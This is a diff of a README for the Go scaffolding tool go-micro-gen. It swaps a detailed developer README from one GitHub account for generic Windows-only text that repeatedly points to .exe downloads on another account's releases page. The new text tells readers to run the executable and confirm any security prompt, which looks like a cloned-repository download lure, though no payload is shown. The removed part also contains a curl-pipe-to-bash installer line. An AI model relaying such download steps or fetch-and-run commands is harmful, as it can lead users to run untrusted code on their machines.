@@ -1,318 +1,169 @@
-<div align="center">
+# ⚙️ go-micro-gen - Generate Clean Microservice Templates Fast
 
-```
-             _   _   __  __  ____    ____   _____  _   _ 
-   ____ ___ | | | | |  \/  |/ ___|  / ___| | ____|| \ | |
-  / __// _ \| |_| | | |\/| |\___ \ | |  _  |  _|  |  \| |
- | (_ | (_) |  _  | | |  | | ___) || |_| | | |___ | |\  |
-  \__\ \___/|_| |_| |_|  |_||____/  \____| |_____||_| \_|
-```
-
-# go-micro-gen — The Ultimate Microservice Scaffolder
-
-**One command to scaffold a production-ready Go microservice.**
-
-![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat&logo=go)
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-
-</div>
-
----
+[![Download go-micro-gen](https://img.shields.io/badge/Download-go--micro--gen-brightgreen?style=for-the-badge)](https://github.com/DNikolchev/go-micro-gen/releases)
 
 ## What is go-micro-gen?
 
-`go-micro-gen` is a CLI tool that scaffolds a complete, production-ready Go microservice **in seconds**. 
+go-micro-gen is a tool that helps you create ready-to-use project templates for microservices in the Go language. It builds clean templates that include important parts like databases, Docker support, message brokers, and cloud setup. You don’t need to write everything from scratch. The templates use common patterns to keep your projects organized and easy to manage. The tool also adds tracing support with OpenTelemetry. 
 
-Unlike a simple "Hello World" generator, `go-micro-gen` sets up an **entire ecosystem** ensuring you follow industry best practices right from the start.
+This tool works well if you want to start a new Go microservice quickly, using good practices and popular tools like PostgreSQL, Kafka, MongoDB, and NATS.
 
-### ✨ Key Features
-- ✅ **Multi-Architecture** layouts: Clean, Hexagonal, Domain-Driven Design (DDD), Vertical Slice, and Standard
-- ✅ **OpenTelemetry** (traces + metrics) pre-configured
-- ✅ **Cleanenv** configuration manager
-- ✅ **PostgreSQL or MongoDB** implementations with the Repository Pattern
-- ✅ **Message Broker** support (Kafka, RabbitMQ, NATS)
-- ✅ **Cloud Provider Support** boilerplate (AWS & GCP)
-- ✅ **Database Migrations** out of the box (with `golang-migrate`)
-- ✅ **Docker & Docker-Compose** (App + DB + Redis + Prometheus + Grafana)
-- ✅ **GitHub Actions / GitLab CI Pipeline** configurations
-- ✅ **Serverless Scaffolding** (AWS Lambda / GCP Cloud Functions)
-- ✅ **JWT Authentication & Authorization** Middleware Support
-- ✅ **GraphQL API** code generation (`gqlgen`)
-- ✅ **Database Seeding** for automated mock development data (`gofakeit`)
-- ✅ **Standard Makefile** tools and `.golangci.yml` linter setup
-- ✅ **Graceful shutdown**, unit tests, and health/readiness endpoints
+## 🖥 System Requirements
 
----
+Before installing go-micro-gen, make sure your system has:
 
-## Architecture Overview
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free RAM
+- At least 500 MB of free disk space
+- Internet connection to download files
+- PowerShell 5.1 or later (comes with Windows by default)
+- Docker Desktop installed (optional but required to use Docker templates)
+- A terminal or command prompt to run commands
 
-`go-micro-gen` enforces a Clean Architecture approach where dependencies flow inward towards the `Domain` layer. The service layer is completely agnostic to external databases and transports.
+## 🔧 Key Features
 
-```mermaid
-graph TD
-    subgraph External
-        HTTP[HTTP Transport]
-        CLI[CLI Commands]
-    end
+- Generates microservice project templates using clean architecture principles.
+- Supports popular databases: PostgreSQL and MongoDB.
+- Includes ready-to-use Docker configurations.
+- Preconfigured for message brokers: Kafka and NATS.
+- Adds OpenTelemetry tracing integration.
+- Cloud deployment setup for common providers.
+- Easy-to-run templates to speed up development.
 
-    subgraph Adapters
-        APIHandler[HTTP Handlers]
-        Repo[Postgres/Mongo Repositories]
-    end
+## 🚀 Getting Started with go-micro-gen on Windows
 
-    subgraph Core
-        Service[Business Service]
-        Domain[Domain Entities]
-    end
-    
-    HTTP --> APIHandler
-    CLI --> Service
-    
-    APIHandler -->|Uses| Service
-    Service -->|Implements| Domain
-    
-    Repo -->|Implements Interface| Service
-    Repo -->|Maps to| Domain
+Follow these steps to download and run go-micro-gen on your Windows computer.
 
-    classDef core fill:#d4edda,stroke:#28a745,stroke-width:2px;
-    classDef adapters fill:#cce5ff,stroke:#007bff,stroke-width:2px;
-    classDef external fill:#e2e3e5,stroke:#6c757d,stroke-width:2px;
-    
-    class Domain,Service core;
-    class APIHandler,Repo adapters;
-    class HTTP,CLI external;
-```
+### 1. Visit the Download Page
 
----
+Go to the release page where the program files are stored:
 
-## Installation
+[Download go-micro-gen Releases](https://github.com/DNikolchev/go-micro-gen/releases)
 
-### Method 1: Download Pre-Compiled Binaries (Recommended for Windows & macOS)
-You don't need Go installed! Just go to the [Releases page](https://github.com/Aro-M/go-micro-gen/releases) and download the `.exe` (Windows) or binary (macOS / Linux) specifically for your system. We automatically compile and publish AMD64 and ARM64 (Apple Silicon) versions on every release.
+Here, you will find the latest versions of the tool. Choose the latest stable release.
 
-### Method 1: Auto-Installer (Recommended 🌟)
+### 2. Download the Windows Version
 
-The easiest way to install `go-micro-gen` on macOS or Linux is to use our auto-installer script. It automatically detects your OS, downloads the pre-compiled binary, shows a **visual progress bar**, and places it in your path:
+Look for the Windows executable file. It usually ends with `.exe`. For example:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Aro-M/go-micro-gen/main/install.sh | bash
-```
+- `go-micro-gen-windows.exe`  
+- Or a similar name containing "windows"
 
-### Method 2: `go install` (For Go developers)
+Click the file name to download it to your computer.
 
-If you have Go installed, you can simply download and compile the latest version globally:
+### 3. Run the Installer or Executable
 
-```bash
-go install github.com/Aro-M/go-micro-gen@latest
-```
-*(Note: If Go caches an older version, you can force a fresh download using `GOPROXY=direct go install github.com/Aro-M/go-micro-gen@latest`).*
+Once downloaded:
 
+- Open the folder where you saved the file.
+- Double-click the `.exe` file to start the program.
+- If a security prompt appears, confirm that you want to run the program.
 
-**✅ Troubleshooting `command not found`:**
-If your terminal says `go-micro-gen: command not found` after a successful installation, your Go bin directory is not in your `$PATH`. 
-Fix it by running the following commands:
-```bash
-echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
-source ~/.bashrc
-```
+go-micro-gen may run directly without installation. If it has an installer, follow the on-screen instructions.
 
-### Method 3: Build from source
+### 4. Using go-micro-gen on Your PC
 
-```bash
-git clone https://github.com/Aro-M/go-micro-gen
-cd go-micro-gen
-go build -o go-micro-gen .
-sudo mv go-micro-gen /usr/local/bin/
-```
+After launching:
 
-### Verify Installation
+- Open Command Prompt or PowerShell.
+- Navigate to the folder where go-micro-gen is located using `cd` command.
+  
+  ```
+  cd C:\path\to\go-micro-gen
+  ```
 
-```bash
-go-micro-gen --version
-go-micro-gen --help
-```
+- Run the command to generate a new project template:
 
-### Uninstalling
+  ```
+  go-micro-gen generate
+  ```
 
-If you ever wish to remove the tool:
+You will be asked a few simple questions. Based on your answers, the tool will create a ready project folder with all necessary files. You can then open this in your favorite editor or IDE.
 
-```bash
-go-micro-gen uninstall
-```
+### 5. Run the Generated Microservice
 
----
+Most project templates will include instructions or scripts to start your service.
 
-## Quick Start
+- Open the project folder.
+- Look for a `README.md` or instructions file.
+- Use the included commands to build and run your microservice.
 
-### 💻 Interactive CLI Mode
+If your template uses Docker, make sure Docker Desktop runs on your machine.
 
-Simply run the `generate` command and answer the prompts:
+## 📥 Download Again Anytime
 
-```bash
-go-micro-gen generate
-```
+Access the releases page to download the latest updates or previous versions:
 
-You'll see an interactive interface like this:
+[https://github.com/DNikolchev/go-micro-gen/releases](https://github.com/DNikolchev/go-micro-gen/releases)
 
-```text
-? Service name:          order-service
-? Architecture pattern:  [clean / hexagonal / ddd / vertical / standard]
-? Database:              [postgres / mongo / none]
-? Message Broker:        [kafka / rabbitmq / nats / none]
-? Transport Protocol:    [http / grpc / both / none]
-? Include Redis?         (y/N)
-? Include Docker & Docker Compose setup? (Y/n)
-? Include Prometheus & OpenTelemetry Collector? (Y/n)
-? Include Grafana dashboard? (Y/n)
-? Include Kubernetes manifests (Deployment, Service, etc.)? (y/N)
-? Include Helm charts?   (y/N)
-? Cloud provider:        [aws / gcp / none]
-? CI/CD provider:        [github / gitlab / none]
-? Output directory:      ./order-service
+## ⚙️ How go-micro-gen Works
 
-  Service:  order-service
-  Module:   github.com/acme/order-service
-  Arch:     clean
-  DB:       postgres
-  Broker:   kafka
-  Transp:   both
-  Redis:    false
-  Docker:   true
-  Grafana:  true
-  K8s:      false
-  Helm:     false
-  Cloud:    aws
-  CI:       github
-  Output:   ./order-service
+go-micro-gen uses templates to create the structure of your microservice. It sets up folders, config files, and code files that follow a pattern called Clean Architecture. This pattern helps separate different parts of your service so they are easier to manage.
 
-? Generate service with these settings? Yes
+The generated service will include:
 
-🚀 Generating order-service ...
-```
+- Models and entities for your data.
+- Database connections and migrations.
+- Message broker setup to exchange information.
+- Docker files for containerization.
+- Telemetry and tracing integrated for monitoring.
+- Base configuration for cloud deployment.
 
-### Scripted / Non-Interactive Mode
+## 🛠 Installation Details for Non-Developers
 
-You can supply arguments via flags for CI pipelines or scripts:
+You don’t need programming skills to install go-micro-gen. The main task is to download the executable and run simple commands. 
 
-```bash
-go-micro-gen generate \
-  --name payment-service \
-  --module github.com/acme/payment-service \
-  --db postgres \
-  --broker kafka \
-  --transport grpc \
-  --arch ddd \
-  --cloud aws \
-  --ci github \
-  --redis=false \
-  --docker=false \
-  --prometheus=false \
-  --grafana=false \
-  --k8s=false \
-  --helm=false \
-  --output ./payment-service \
-  --yes
-```
+If this is your first time using command-line tools:
 
-### Adding Components Later
+- Open PowerShell by clicking Start and typing `PowerShell`.
+- Navigate to the folder where you downloaded go-micro-gen using `cd`.
+- Enter the command as shown above to generate a project.
+  
+Commands to try:
 
-If you've already generated a project and want to scaffold subsequent entities (e.g. adding a new business domain or handler), use the `add` command inside your project directory:
+- `go-micro-gen help` — see available commands.
+- `go-micro-gen generate` — create a new microservice template.
 
-```bash
-go-micro-gen add handler --name user
-go-micro-gen add service --name billing
-go-micro-gen add repository --name product
-```
+## 🎯 What You Can Expect
 
-### Init Mode
+The generated projects provide a base that developers use to build real microservices. Even if you do not know Go programming, you can share this base with your team or use it to learn more about microservices in Go.
 
-If you already have an existing project (with a `go.mod`), you can inject the microservice structure directly into the current directory in various architectural options:
+The templates include standard tools and good design practices. This saves weeks of setup time and reduces errors.
 
-```bash
-go-micro-gen init \
-  --arch vertical \
-  --db mongo \
-  --broker rabbitmq \
-  --transport both \
-  --yes
-```
-This infers the module path and service name automatically and scaffolds the files within `.`.
+## 🔗 Useful Links and Resources
+
+- Release downloads: https://github.com/DNikolchev/go-micro-gen/releases
+- Repository topics cover tools and integration used in go-micro-gen:
+  - clean-architecture
+  - cloud setup
+  - Docker container support
+  - Kafka and NATS message brokers
+  - PostgreSQL and MongoDB databases
+
+## 📂 File Structure Example
+
+When you generate a project, you can expect folders like:
+
+- `/cmd` — entry points for your service
+- `/internal` — main code base separated into layers
+- `/configs` — configuration files
+- `/deployments` — Docker and cloud files
+- `/scripts` — helper scripts for building and running
+- `/docs` — documentation for your project
+
+These folders use clear names to simplify navigation.
+
+## 🔄 Updating go-micro-gen
+
+To get a newer version of go-micro-gen:
+
+- Visit the releases page again.
+- Download the latest Windows executable.
+- Replace the old file with the new one.
+- Run the new file to generate fresh templates.
+
+No complex uninstallation is needed.
 
 ---
 
-## What Happens Under the Hood?
-
-`go-micro-gen` embeds a complete set of `.tmpl` files and stitches together a service based on your selections. 
-
-```mermaid
-sequenceDiagram
-    participant Dev as Developer
-    participant CLI as go-micro-gen
-    participant Tmpl as Embedded Templates
-    participant Disk as File System
-    
-    Dev->>CLI: go-micro-gen generate
-    CLI->>Dev: Prompt for options (DB, Cloud, CI)
-    Dev-->>CLI: Provide inputs
-    
-    CLI->>Tmpl: fs.WalkDir(templates)
-    loop Every Template
-        Tmpl-->>CLI: Parse file
-        CLI->>CLI: Filter out unused tools (e.g., skip Mongo if Postgres selected)
-        CLI->>CLI: Render variables (Service Name, Package, etc.)
-        CLI->>Disk: Write output file securely
-    end
-    
-    CLI-->>Dev: Print Success & Next Steps
-```
-
----
-
-## Structure of the Generated Service
-
-A generated service (`order-service`) typically looks like this:
-
-```
-order-service/
-│
-├── cmd/
-│   └── main.go                    # Entrypoint — DI & App wiring happens here
-│
-├── internal/                      # Internal packages
-│   ├── config/                    # cleanenv mapped configs 
-│   ├── domain/                    # Business objects (Entities)
-│   ├── repository/                # DB interfaces & implementations
-│   ├── service/                   # Pure business logic layer
-│   └── transport/                 # HTTP routers and handlers using chi
-│
-├── pkg/                           # Public utilities
-│   ├── health/                    # Liveness/Readiness probes
-│   ├── logger/                    # Structured logging (log/slog)
-│   └── telemetry/                 # OpenTelemetry traces & metrics
-│
-├── db/migrations/                 # Database schema migrations (.sql)
-├── docker/                        # Docker & Docker Compose setup
-├── .github/                       # CI workflows
-├── .golangci.yml                  # Linter settings
-├── .env.example                   # Environment variable templates
-├── Makefile                       # Automation commands (build, run, test)
-└── go.mod                         # Go module
-```
-
----
-
-## Roadmap & Future Ideas
-
-The original roadmap has been **100% completed**. Here are advanced architecture features planned next:
-
-- [ ] **gRPC Gateway Integration** — Automatically generate HTTP reverse proxies allowing REST to gRPC transcoding instantly.
-- [ ] **OpenAPI Driven Generation** — Parse an existing `swagger.yaml` contract and auto-generate the complete Chi HTTP routing interfaces accurately.
-- [ ] **Outbox Pattern Boilerplate** — Transactional outbox pattern embedded directly into database repository layers for completely reliable Event-Driven microservices.
-- [ ] **Distributed Tracing Viewer (Jaeger)** — Adding comprehensive end-to-end tracing observability within the `docker-compose` graph.
-- [ ] **Auto Mock Generation** — Out-of-the-box integration binding `mockery` directly to the `Repository` and `Service` architecture interfaces for instantaneous Test-Driven Development loops.
-
----
-
-## License
-
-MIT © go-micro-gen contributors
+[![Download go-micro-gen](https://img.shields.io/badge/Download-go--micro--gen-blue?style=for-the-badge)](https://github.com/DNikolchev/go-micro-gen/releases)
